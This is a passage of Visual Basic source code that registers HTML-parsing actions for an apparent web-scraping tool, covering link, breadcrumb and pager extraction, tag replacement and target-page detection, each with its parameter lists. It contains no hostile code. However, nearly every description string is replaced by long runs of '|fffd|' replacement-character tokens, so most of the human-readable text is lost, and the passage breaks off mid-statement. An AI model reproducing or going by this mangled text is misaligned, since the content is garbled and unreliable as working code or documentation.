                       "|fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| innerHTML/outerHTML/ConvertToText." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (1, 2 |fffd||fffd||fffd| last), " & _
                       "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| join - |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, " & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine
        .AddParameter "TagName", aps_Combo, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, DIV |fffd||fffd||fffd| TABLE)", TAGS_ARRAY_FULL, "div"
        .AddParameter "AttrName", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", _
                      Array("AttributesPattern", "id", "name", "class", "title", "type", "itemprop"), ""
        .AddParameter "AttrValue", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Result", aps_Combo, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", _
                      Array("outerHTML", "outerHTML join", "innerHTML", "innerHTML join", "ConvertToText", "ConvertToText 1", "ConvertToText join", _
                            "content", "href", "href_with_prefix", "URL|Text", "src", "src_with_prefix", "DeleteTags", "ReplaceTagWithItsText", "value", "data", "TagHeaderOnly"), "innerHTML"
    End With

    With AAs.AddAction(fc_HTML, "ConvertHTMLtoText", "HTML: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "RemoveExtraLF", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd|"
    End With

    With AAs.AddAction(fc_HTML, "GetHyperlinkAndText", "HTML: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| <a>." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| /catalog/page123.html, |fffd|.|fffd|. |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|), " & _
                       "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| %WebsiteURL% |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & _
                       "1. |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| <a>;  2. |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| href; 3. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|);" & vbNewLine & _
                       "4. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|;  5. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| <a>; 6. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd| |fffd||fffd||fffd||fffd||fffd|; 7. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "Prefix", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, http://site.ru)", , WEBSITE_URL_VARNAME$
        .AddParameter "URL_VarName", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "URL", "sectionURL", "itemURL", "pageURL", "categoryURL"), ""
        .AddParameter "Text_VarName", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", _
                      Array("", "CatName", "SectionName", "LinkText", "|fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"), ""
    End With

    With AAs.AddAction(fc_HTML, "GetBreadcrumbs", "HTML: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (Breadcrumbs)." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|), " & _
                       "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & _
                       "1. |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| breadcrumb;  2. |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| <a>, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|; 3. |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"

        .AddParameter "Filters", aps_Combo, "HTML |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, class=navigation)", Array("", "id=breadcrumbs", "id=nav"), ""
        .AddParameter "First", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("1", "2", "3", "4"), "1"
        .AddParameter "RemoveLast", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "1", "2"), ""
    End With


    With AAs.AddAction(fc_HTML, "GetPagerLinks", "HTML: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & _
                       "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| <|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 1 2 3 .. 10 .. 155 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|>" & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & _
                       "1) HTML |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(|fffd||fffd||fffd||fffd| div id=pager |fffd||fffd||fffd| class=navigation), " & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| auto |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "2) |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|), " & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, &offset= |fffd||fffd||fffd| /page/ (|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & _
                       "3) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd|, " & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|: min=0&step=24 (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "Filters", aps_Combo, "HTML |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, class=pager)", Array("", "auto", "ul class=pager", "id=pager"), "auto"
        .AddParameter "PagerMask", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "&page=", "&offset=", "&PAGEN_1=", "/page/"), ""
        .AddParameter "Metrics", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", _
                      Array("", "min=0", "min=1&step=24", "min=0&shift=+1", "DeleteBaseURL=1", "DeleteBaseURL=1&shift=+1&min=0"), ""
    End With

    With AAs.AddAction(fc_HTML, "ReplaceTags", "HTML: |fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, td class=cell, |fffd||fffd||fffd| id=content, |fffd||fffd||fffd| div, |fffd||fffd||fffd| attr=attrvalue, |fffd||fffd||fffd| div =AttrMask)," & vbNewLine & _
                       "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| InnerHTML |fffd||fffd||fffd| outerHTML |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|), " & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, [data-count] [=text] size[data-size])" & vbNewLine & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| [=text] |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| [=inner] |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, " & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| [attr] |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| attr"
        .AddParameter "Tag", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, td class=cell)"
        .AddParameter "ReplaceType", aps_Combo, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", _
                      Array("ReplaceInnerHTML", "AddBeforeInnerHTML", "AddAfterInnerHTML", "ReplaceOuterHTML", "AddBeforeOuterHTML", "AddAfterOuterHTML", "GetInnerHTML"), "ReplaceInnerHTML"
        .AddParameter "ReplacePattern", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "[=text]", "[=inner]"), ""
    End With

    With AAs.AddAction(fc_HTML, "FindTargetPages", "HTML: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
